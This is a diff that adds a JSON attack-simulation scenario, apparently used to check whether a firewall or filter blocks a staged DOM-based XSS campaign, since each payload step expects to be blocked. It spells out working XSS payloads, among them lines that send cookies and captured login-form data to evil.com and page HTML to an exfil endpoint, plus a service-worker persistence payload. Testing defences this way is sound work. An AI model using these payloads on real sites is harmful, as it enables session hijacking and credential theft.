@@ -1,0 +1,203 @@
+{
+  "id": "dom-xss-advanced",
+  "name": "Advanced DOM-Based XSS Campaign",
+  "category": "Client-Side Attacks",
+  "difficulty": "Expert",
+  "description": "Sophisticated DOM-based XSS attack chain exploiting client-side JavaScript processing, URL fragments, postMessage, and modern web APIs",
+  "tags": [
+    "dom-xss",
+    "client-side",
+    "javascript",
+    "postmessage",
+    "fragment",
+    "mutation"
+  ],
+  "steps": [
+    {
+      "id": "dom-recon-1",
+      "name": "JavaScript Framework Detection",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/app",
+        "params": {
+          "debug": "1"
+        }
+      },
+      "execution": {
+        "delayMs": 400
+      }
+    },
+    {
+      "id": "dom-probe-1",
+      "name": "URL Fragment Reflection Test",
+      "stage": "delivery",
+      "request": {
+        "method": "GET",
+        "url": "/dashboard",
+        "params": {
+          "redirect": "#<img src=x onerror=alert('DOM-XSS')>"
+        }
+      },
+      "execution": {
+        "delayMs": 800
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "dom-recon-1"
+      ]
+    },
+    {
+      "id": "dom-probe-2",
+      "name": "PostMessage Origin Bypass",
+      "stage": "delivery",
+      "request": {
+        "method": "POST",
+        "url": "/api/frame/message",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": "{\"origin\": \"*\", \"data\": \"<script>eval(atob('YWxlcnQoJ1Bvc3RNZXNzYWdlIFhTUycp'))</script>\"}"
+      },
+      "execution": {
+        "delayMs": 1200
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "dom-probe-1"
+      ]
+    },
+    {
+      "id": "dom-exploit-1",
+      "name": "innerHTML Sink Exploitation",
+      "stage": "exploitation",
+      "request": {
+        "method": "GET",
+        "url": "/search/results",
+        "params": {
+          "q": "test</script><svg onload=fetch('//evil.com/'+document.cookie)>"
+        }
+      },
+      "execution": {
+        "delayMs": 1600
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "dom-probe-2"
+      ]
+    },
+    {
+      "id": "dom-exploit-2",
+      "name": "jQuery HTML Manipulation",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/widget/update",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": "{\"content\": \"<div><img src onerror='$(\\\"<iframe src=javascript:alert(/jQuery-XSS/)>\\\").appendTo(\\\"body\\\")'></div>\"}"
+      },
+      "execution": {
+        "delayMs": 2000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "dom-exploit-1"
+      ]
+    },
+    {
+      "id": "dom-exploit-3",
+      "name": "Web Storage XSS Persistence",
+      "stage": "exploitation",
+      "request": {
+        "method": "GET",
+        "url": "/profile/settings",
+        "params": {
+          "theme": "dark\\\";localStorage.setItem('xss','<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>');//"
+        }
+      },
+      "execution": {
+        "delayMs": 2400
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "dom-exploit-2"
+      ]
+    },
+    {
+      "id": "dom-exploit-4",
+      "name": "Mutation Observer Bypass",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/content/parse",
+        "headers": {
+          "Content-Type": "text/html"
+        },
+        "body": "<div id='payload'></div><script>setTimeout(()=>document.getElementById('payload').innerHTML='<img src=x onerror=fetch(\"/exfil?data=\"+btoa(document.documentElement.outerHTML))>',100)</script>"
+      },
+      "execution": {
+        "delayMs": 2800
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "dom-exploit-3"
+      ]
+    },
+    {
+      "id": "dom-exfiltrate-1",
+      "name": "Credential Harvesting via DOM",
+      "stage": "exfiltration",
+      "request": {
+        "method": "GET",
+        "url": "/login",
+        "params": {
+          "return_to": "javascript:Array.from(document.forms).forEach(f=>f.addEventListener('submit',e=>{fetch('//evil.com/creds?'+new URLSearchParams(new FormData(e.target)))}))"
+        }
+      },
+      "execution": {
+        "delayMs": 3200
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "dom-exploit-4"
+      ]
+    },
+    {
+      "id": "dom-persist-1",
+      "name": "Service Worker XSS Persistence",
+      "stage": "persistence",
+      "request": {
+        "method": "GET",
+        "url": "/manifest.json",
+        "params": {
+          "sw": "data:application/javascript,self.addEventListener('fetch',e=>e.respondWith(new Response('<script>eval(atob(\\''+btoa('alert(\"Persistent SW XSS\")')+'\\')</script>',{headers:{'content-type':'text/html'}})))"
+        }
+      },
+      "execution": {
+        "delayMs": 3600
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "dom-exfiltrate-1"
+      ]
+    }
+  ]
+}
